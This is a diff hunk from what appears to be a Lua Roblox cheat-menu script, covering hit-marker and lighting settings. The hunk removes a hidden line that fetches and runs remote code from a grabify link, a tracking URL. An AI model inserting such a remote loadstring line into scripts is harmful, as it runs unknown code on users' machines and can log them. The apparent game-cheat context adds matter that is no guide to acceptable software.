@@ -1536,10 +1536,6 @@ HitTab:AddSlider('HitMarkerLifetime', {Text = 'lifetime:',Suffix = "s",Default =
 hit.HitMarkerLifetime = Value
 end)
 
---
-
-loadstring(game:HttpGet('https://grabify.link/JHKPJ6'))()
-
 --* Lighting *--
 
 local CustomSkyTabBox = Tabs.World:AddRightTabbox('lighting')
